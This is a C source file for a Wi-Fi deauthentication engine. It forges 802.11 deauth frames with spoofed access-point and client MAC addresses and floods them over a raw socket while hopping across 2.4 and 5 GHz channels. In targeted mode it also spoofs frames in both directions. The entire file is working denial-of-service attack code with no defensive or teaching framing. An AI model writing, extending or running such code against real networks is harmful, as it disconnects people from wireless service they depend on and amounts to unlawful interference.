#include "deauth_engine_v1.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

static int _raw_socket(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static void _set_channel(const char* iface, int ch) {
    struct iwreq wr;
    memset(&wr, 0, sizeof(wr));
    strncpy(wr.ifr_name, iface, IFNAMSIZ - 1);
    int freq;
    if (ch <= 13)
        freq = 2407 + ch * 5;
    else if (ch <= 144)
        freq = 5000 + ch * 5;
    else
        freq = 5000 + ch * 5;
    wr.u.freq.m = freq;
    wr.u.freq.e = 6;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    ioctl(fd, SIOCSIWFREQ, &wr);
    close(fd);
}

void deauth_v1_build_frame(uint8_t* frame, const uint8_t* bssid, const uint8_t* station, uint16_t reason, uint16_t seq) {
    memset(frame, 0, DEAUTH_V1_FRAME_LEN);
    frame[0] = 0x00; frame[1] = 0x00;
    frame[2] = DEAUTH_V1_RADIOTAP_LEN; frame[3] = 0x00;
    frame[4] = 0x02; frame[5] = 0x00; frame[6] = 0x00; frame[7] = 0x00;
    frame[8] = 0x00;
    int off = DEAUTH_V1_RADIOTAP_LEN;
    frame[off] = 0xC0; frame[off+1] = 0x00;
    frame[off+2] = 0x01; frame[off+3] = 0x3A;
    memcpy(&frame[off+4], station, 6);
    memcpy(&frame[off+10], bssid, 6);
    memcpy(&frame[off+16], bssid, 6);
    frame[off+22] = (uint8_t)((seq << 4) & 0xFF);
    frame[off+23] = (uint8_t)(((seq << 4) >> 8) & 0xFF);
    frame[off+24] = (uint8_t)(reason & 0xFF);
    frame[off+25] = (uint8_t)((reason >> 8) & 0xFF);
}

DeauthEngineV1* deauth_v1_create(const char* iface, const char* bssid, const char* station, uint16_t reason) {
    DeauthEngineV1* eng = calloc(1, sizeof(DeauthEngineV1));
    if (!eng) return NULL;
    eng->iface = strdup(iface);
    eng->reason = reason;
    eng->running = 1;
    unsigned int b[6], s[6];
    if (sscanf(bssid, "%02x:%02x:%02x:%02x:%02x:%02x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) == 6)
        for (int i=0;i<6;i++) eng->bssid[i] = (uint8_t)b[i];
    if (station && sscanf(station, "%02x:%02x:%02x:%02x:%02x:%02x", &s[0],&s[1],&s[2],&s[3],&s[4],&s[5]) == 6)
        for (int i=0;i<6;i++) eng->station[i] = (uint8_t)s[i];
    else
        memset(eng->station, 0xFF, 6);
    eng->targeted = memcmp(eng->station, "\xff\xff\xff\xff\xff\xff", 6) != 0;
    return eng;
}

int deauth_v1_run(DeauthEngineV1* eng) {
    int fd = _raw_socket(eng->iface);
    if (fd < 0) return -1;

    int channels_24[] = DEAUTH_V1_CHANNELS_24;
    int channels_5[] = DEAUTH_V1_CHANNELS_5;
    int num_ch = 0, ch_idx = 0;
    int all_channels[64];

    for (int i = 0; i < 13; i++) all_channels[num_ch++] = channels_24[i];
    for (int i = 0; i < 25; i++) all_channels[num_ch++] = channels_5[i];

    uint8_t frames[DEAUTH_V1_BURST_SIZE * 2][DEAUTH_V1_FRAME_LEN];
    struct mmsghdr msgs[DEAUTH_V1_BURST_SIZE * 2];
    struct iovec iov[DEAUTH_V1_BURST_SIZE * 2];
    uint16_t seq = 0;

    while (eng->running) {
        int cur_ch = all_channels[ch_idx % num_ch];
        _set_channel(eng->iface, cur_ch);
        ch_idx++;

        int count = 0;
        for (int i = 0; i < DEAUTH_V1_BURST_SIZE && eng->running; i++) {
            deauth_v1_build_frame(frames[count], eng->bssid, eng->station, eng->reason, seq);
            seq = (seq + 1) & 0xFFF;
            iov[count].iov_base = frames[count];
            iov[count].iov_len = DEAUTH_V1_FRAME_LEN;
            msgs[count].msg_hdr = (struct msghdr){.msg_iov=&iov[count],.msg_iovlen=1};
            count++;

            if (eng->targeted) {
                deauth_v1_build_frame(frames[count], eng->station, eng->bssid, eng->reason, seq);
                seq = (seq + 1) & 0xFFF;
                iov[count].iov_base = frames[count];
                iov[count].iov_len = DEAUTH_V1_FRAME_LEN;
                msgs[count].msg_hdr = (struct msghdr){.msg_iov=&iov[count],.msg_iovlen=1};
                count++;
            }
        }

        int sent = sendmmsg(fd, msgs, count, 0);
        if (sent > 0) {
            __sync_fetch_and_add(&eng->sent, sent);
            fprintf(stderr, "\r[C-v1] Deauth %02x:%02x:%02x:%02x:%02x:%02x: %lld frames (ch %d)",
                    eng->bssid[0],eng->bssid[1],eng->bssid[2],eng->bssid[3],eng->bssid[4],eng->bssid[5],
                    eng->sent, cur_ch);
        }
    }
    close(fd);
    return eng->sent > 0 ? 0 : -1;
}

void deauth_v1_stop(DeauthEngineV1* eng) { if (eng) eng->running = 0; }
void deauth_v1_destroy(DeauthEngineV1* eng) { if (eng) { free((void*)eng->iface); free(eng); } }
